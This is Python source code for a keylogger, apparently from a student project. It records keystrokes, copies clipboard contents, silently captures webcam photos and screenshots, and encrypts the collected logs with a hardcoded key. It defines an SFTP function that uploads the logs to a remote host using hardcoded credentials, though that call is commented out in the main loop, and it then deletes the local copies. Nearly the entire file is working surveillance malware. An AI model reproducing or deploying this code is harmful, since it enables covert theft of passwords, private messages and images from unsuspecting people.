# Libraries
import cv2
from threading import Timer
import pysftp
import socket
import platform
import win32clipboard
import sys

from pynput.keyboard import Key, Listener
import pyscreenshot

import time
import os

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
clipboard_information = "Clipboard.txt"
camera_information = ".png"
screenshot_information = ".png"

time_iterations = 10
number_of_iterations_end = 3

myHostname = "192.168.1.6"  # change this
myUsername = "pi"  # change this
myPassword = "kali123"  # change this #should be 8 characters or more including special characters
remote_file = '/home/pi/transfer/'

i = 0  # global variable to change the name of image as we click

file_path = "D:\\Stuff\\D studies\\Adv dip of it\\Semester 5\\Applied projects\\Keylogger\\Project\\log_files"
extend = "\\"
file_merge = file_path + extend


# only string will be recorded
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard Data could not be retrieved")


copy_clipboard()


def capture_webcam():
    camera = cv2.VideoCapture(0)
    time_str = time.strftime("IMG_%Y%m%d_%H%M%S")
    check, frame = camera.read()
    cv2.waitKey(0)
    camera.release()
    cv2.imwrite(file_path + extend + time_str + camera_information, frame)


capture_webcam()


def screenshots():
    imgrb = ImageGrab.grab()
    time_str = time.strftime("SGB_%Y%m%d_%H%M%S")
    imgrb.save(file_path + extend + time_str + screenshot_information)


screenshots()


def encrypt_files():
    folderName = "D:\Stuff\D studies\Adv dip of it\Semester 5\Applied projects\Keylogger\Project\log_files"
    encrypted_dir = f"{folderName}"
    key = "BhbZu8TldX1E7eFjhfkppHVmbu7xZaW0XKMOI-eLXU4="  # enter key here
    folders = [j for j in os.listdir(encrypted_dir) if os.path.isfile(os.path.join(encrypted_dir, j))]

    for j in folders:
        x = "\\"
        z = encrypted_dir + x + j
        with open(z, 'rb') as f:
            data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(z, 'wb') as f:
                f.write(encrypted)
                print(z)
                z = encrypted_dir
    print("files in folder encrypted")


def sftp_files():
    with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
        print("Connection Successfully Established")
        sftp.chdir(remote_file)
        time_str = time.strftime("log_%Y%m%d_%H%M")
        sftp.mkdir(time_str)
        print("Directory created")
        sftp.chdir(time_str)
        slash = "/"
        new_path = sftp.pwd
        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)
        sftp.close()


def delete_files():
    for file_name in os.listdir(file_merge):
        file = file_merge + file_name
        if os.path.isfile(file):
            print('Deleting file:', file)
            os.remove(file)


def read_file():
    string1 = ['quick', 'brown', 'fox', 'jumps']
    # opening a text file
    file1 = open(file_merge + keys_information, "r")

    # setting flag and index to 0
    flag = 0
    index = 0

    for line in string1:
        if any(word in line for word in string1):
            print(line)
            print("the word was found")

    # closing text file
    file1.close()


number_of_iterations = 0
currentTime = time.time()
stopTime = time.time() + time_iterations

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Keys") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stopTime:
        screenshots()
        copy_clipboard()
        capture_webcam()
        time.sleep(40)
        read_file()
        encrypt_files()
        # sftp_files()
        delete_files()

        number_of_iterations += 1

        currentTime = time.time()
        stopTime = time.time() + time_iterations

